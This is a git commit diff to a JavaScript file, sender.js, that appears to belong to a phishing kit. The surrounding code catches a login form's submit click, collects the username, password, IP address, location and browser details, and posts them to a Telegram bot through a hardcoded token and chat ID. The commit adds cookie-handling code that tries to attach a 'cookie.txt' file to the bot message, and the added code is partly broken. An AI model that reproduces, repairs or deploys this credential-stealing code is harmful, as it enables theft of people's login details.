6dfc5c3b17ef5713c26242e8049aea97a07f8535
Richyyyo <136366567+Richyyyo@users.noreply.github.com>
2024-12-04 21:44:15 -0600

    Add files via upload

--- sender.js
+++ sender.js
@@ -18,6 +18,45 @@ function getCurrentTime() {
   return new Date().toUTCString();
 }
 
+// Function to set a cookie
+function setCookie(name, value, days) {
+  let expires = "";
+  if (days) {
+    const date = new Date();
+    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+    expires = "; expires=" + date.toUTCString();
+  }
+  document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
+
+// Function to get the value of a cookie by name
+function getCookie(name) {
+  const nameEQ = name + "=";
+  const ca = document.cookie.split(";");
+  for (let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) === " ") c = c.substring(1, c.length);
+    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+  }
+  return null;
+}
+
+// Create a unique identifier
+const uniqueID = "id_" + Math.random().toString(36).substr(2, 9);
+
+// Set the cookie with the unique identifier
+setCookie("uniqueID", uniqueID, 7);
+
+const cookieValue = getCookie("uniqueID");
+if (cookieValue) {
+  const blob = new Blob([cookieValue], { type: "text/plain" });
+
+  // Create a link element
+  const link = document.createElement("a");
+  link.href = URL.createObjectURL(blob);
+  link.download = "cookie.txt";
+}
+
 document
   .querySelector('q2-btn[test-id="btnSubmit"]')
   .addEventListener("click", async function (event) {
@@ -37,7 +76,10 @@ document
     // Data to bot
     const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
     const chatId = "1139790477";
+    const formData = new FormData();
     const message = `Username 👤: ${username} \n Password 🔑: ${password} \n IP Address 🌍: ${ip} \n Location 📍: ${location} \n Browser Info 🌎: ${browserInfo} \n Time 🕰️: ${currentTime}`;
+    formData.append("chat_id", chatId);
+    formData.append("document", blob, "cookie.txt");
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: `POST`,
